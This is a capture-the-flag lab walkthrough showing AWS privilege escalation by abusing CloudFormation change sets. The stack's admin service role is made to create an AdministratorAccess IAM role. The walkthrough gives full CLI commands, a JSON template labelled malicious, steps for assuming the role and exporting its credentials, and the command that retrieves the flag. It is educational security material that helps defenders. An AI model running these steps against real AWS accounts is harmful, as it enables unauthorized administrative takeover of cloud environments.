# Guided Walkthrough: Privilege Escalation via cloudformation:CreateChangeSet + ExecuteChangeSet

This scenario demonstrates a sophisticated privilege escalation technique where an attacker with `cloudformation:CreateChangeSet` and `cloudformation:ExecuteChangeSet` permissions can inherit administrative privileges from an existing CloudFormation stack's service role. Unlike direct stack updates which require explicit permissions on the resources being modified, change set execution bypasses traditional IAM permission checks by delegating all operations to the stack's attached service role.

The vulnerability arises from a fundamental aspect of CloudFormation's change set architecture. When a change set is executed, CloudFormation uses the stack's service role to perform all resource modifications — regardless of the caller's own permissions. If that service role has administrative privileges (a common practice to allow stacks to manage any AWS resources), an attacker can inject malicious infrastructure changes through the change set mechanism without needing those elevated permissions directly.

This attack is particularly insidious because it exploits the AWS managed policy `SecretsManagerReadWrite`, which many organizations grant broadly for secrets management operations. This policy includes `cloudformation:CreateChangeSet` and `cloudformation:ExecuteChangeSet` permissions, inadvertently creating privilege escalation paths wherever CloudFormation stacks with privileged service roles exist. The technique was documented in the AWS security community blog post: https://dev.to/aws-builders/cloudformation-change-set-privilege-escalation-18i6

## The Challenge

You have obtained credentials for `pl-prod-cloudformation-005-to-admin-starting-user`. This IAM user has `cloudformation:CreateChangeSet` and `cloudformation:ExecuteChangeSet` permissions scoped to all resources, but cannot perform any administrative operations like listing IAM users or modifying IAM policies directly.

Your goal is to reach `pl-prod-cloudformation-005-to-admin-escalated-role`, an IAM role with AdministratorAccess. That role does not exist yet — you need to create it by weaponizing an existing CloudFormation stack.

## Reconnaissance

First, confirm your identity and verify you lack admin permissions:

```bash
aws sts get-caller-identity --query 'Arn' --output text
# arn:aws:iam::{account_id}:user/pl-prod-cloudformation-005-to-admin-starting-user

aws iam list-users --max-items 1
# An error occurred (AccessDenied) ...
```

Good — no admin access yet. Now look for CloudFormation stacks in the account and, critically, identify any that have a service role attached:

```bash
aws cloudformation describe-stacks \
  --query 'Stacks[*].{Name:StackName,Role:RoleARN,Status:StackStatus}' \
  --output table
```

You'll find `pl-prod-cloudformation-005-to-admin-target-stack` with a `RoleARN` pointing to `pl-prod-cloudformation-005-to-admin-stack-role`. That role has `AdministratorAccess` attached. This is your target.

Inspect what the stack currently manages — it's benign, just an S3 bucket:

```bash
aws cloudformation get-template \
  --stack-name pl-prod-cloudformation-005-to-admin-target-stack \
  --query 'TemplateBody' \
  --output text
```

The key insight: you can submit a change set with a modified template. When you execute that change set, CloudFormation performs all resource operations as the stack's service role — not as you. If the template adds an IAM role, the stack's admin service role creates that IAM role, even though you personally lack `iam:CreateRole`.

## Exploitation

### Step 1: Craft the malicious template

Build a CloudFormation template that keeps the existing S3 bucket (required — you can't delete managed resources via a change set without removing them from the template) and adds a new IAM role with AdministratorAccess trusting your starting user:

```json
{
  "AWSTemplateFormatVersion": "2010-09-09",
  "Resources": {
    "InitialBucket": {
      "Type": "AWS::S3::Bucket",
      "Properties": {
        "BucketName": "pl-prod-cloudformation-005-to-admin-initial-bucket-{account_id}-{resource_suffix}"
      }
    },
    "EscalatedAdminRole": {
      "Type": "AWS::IAM::Role",
      "Properties": {
        "RoleName": "pl-prod-cloudformation-005-to-admin-escalated-role",
        "AssumeRolePolicyDocument": {
          "Version": "2012-10-17",
          "Statement": [{
            "Effect": "Allow",
            "Principal": {
              "AWS": "arn:aws:iam::{account_id}:user/pl-prod-cloudformation-005-to-admin-starting-user"
            },
            "Action": "sts:AssumeRole"
          }]
        },
        "ManagedPolicyArns": ["arn:aws:iam::aws:policy/AdministratorAccess"]
      }
    }
  }
}
```

Save this to `/tmp/malicious-changeset-template.json`.

### Step 2: Create the change set

Submit the change set against the target stack. Note you need `CAPABILITY_NAMED_IAM` because the template creates an IAM role with a specific name:

```bash
aws cloudformation create-change-set \
  --stack-name pl-prod-cloudformation-005-to-admin-target-stack \
  --change-set-name pl-prod-cloudformation-005-escalation-changeset \
  --template-body file:///tmp/malicious-changeset-template.json \
  --capabilities CAPABILITY_NAMED_IAM \
  --change-set-type UPDATE \
  --description "Escalation via CreateChangeSet - adds admin role"
```

Wait for it to reach `CREATE_COMPLETE` status (about 15 seconds), then inspect what it plans to do:

```bash
aws cloudformation describe-change-set \
  --stack-name pl-prod-cloudformation-005-to-admin-target-stack \
  --change-set-name pl-prod-cloudformation-005-escalation-changeset \
  --query 'Changes[*].ResourceChange.{Action:Action,Resource:LogicalResourceId,Type:ResourceType}' \
  --output table
```

You'll see `Add` for `EscalatedAdminRole`. The change set is staged and ready.

### Step 3: Execute the change set

This is the critical step. Your `cloudformation:ExecuteChangeSet` permission triggers the execution, but all actual resource operations are performed by the stack's admin service role:

```bash
aws cloudformation execute-change-set \
  --stack-name pl-prod-cloudformation-005-to-admin-target-stack \
  --change-set-name pl-prod-cloudformation-005-escalation-changeset
```

Wait for the stack update to complete:

```bash
aws cloudformation wait stack-update-complete \
  --stack-name pl-prod-cloudformation-005-to-admin-target-stack
```

### Step 4: Assume the escalated role

The stack's admin service role has now created `pl-prod-cloudformation-005-to-admin-escalated-role` with AdministratorAccess and a trust policy that allows your starting user to assume it. Wait roughly 15 seconds for IAM propagation, then:

```bash
CREDENTIALS=$(aws sts assume-role \
  --role-arn arn:aws:iam::{account_id}:role/pl-prod-cloudformation-005-to-admin-escalated-role \
  --role-session-name escalation-demo-session \
  --query 'Credentials' \
  --output json)

export AWS_ACCESS_KEY_ID=$(echo $CREDENTIALS | jq -r '.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $CREDENTIALS | jq -r '.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo $CREDENTIALS | jq -r '.SessionToken')
```

## Verification

Confirm you now have admin access:

```bash
aws sts get-caller-identity --query 'Arn' --output text
# arn:aws:sts::{account_id}:assumed-role/pl-prod-cloudformation-005-to-admin-escalated-role/escalation-demo-session

aws iam list-users --max-items 3 --output table
# Returns a list of IAM users — admin access confirmed
```

## Capture the Flag

Admin access isn't the finish line — the flag is. Every Pathfinding Labs scenario stores a flag in a well-known location, and retrieving it is how you prove the end-to-end attack worked. For `to-admin` scenarios like this one, the flag lives in AWS Systems Manager Parameter Store at a predictable path under `/pathfinding-labs/flags/`. Reading it requires `ssm:GetParameter` on that specific parameter, which the `AdministratorAccess` managed policy on the escalated role provides implicitly.

Using the assumed escalated role credentials (which hold `AdministratorAccess`), read the flag:

```bash
aws ssm get-parameter \
  --name /pathfinding-labs/flags/cloudformation-005-to-admin \
  --query 'Parameter.Value' \
  --output text
# flag{...}  — your scenario-specific flag value
```

The value printed is the flag you submit to complete the challenge. Its exact contents are deployment-specific (the default ships in `flags.default.yaml` in the repo root; vendors running hosted labs can swap in their own set via `plabs init --flag-file` or `plabs flags import`). The retrieval mechanism and path are identical across every `to-admin` scenario, so this same command works as the final step for any of them — only the scenario ID in the path changes.

## What Happened

You exploited a fundamental property of CloudFormation's execution model: when a change set runs, CloudFormation acts as the stack's service role, not as the caller. Your `cloudformation:CreateChangeSet` and `cloudformation:ExecuteChangeSet` permissions were all you needed — you never touched `iam:CreateRole` directly. The stack's `AdministratorAccess` service role did that work for you.

This pattern appears wherever organizations grant broad CloudFormation permissions — for example, the AWS-managed `SecretsManagerReadWrite` policy includes both change set permissions. Any developer or service account with this policy attached, in an account where a CloudFormation stack with an admin service role exists, has a viable privilege escalation path. Unlike `cloudformation:UpdateStack`, change sets can seem safer because they add an "approval" step — but without restricting *who* can execute them, that approval is illusory.
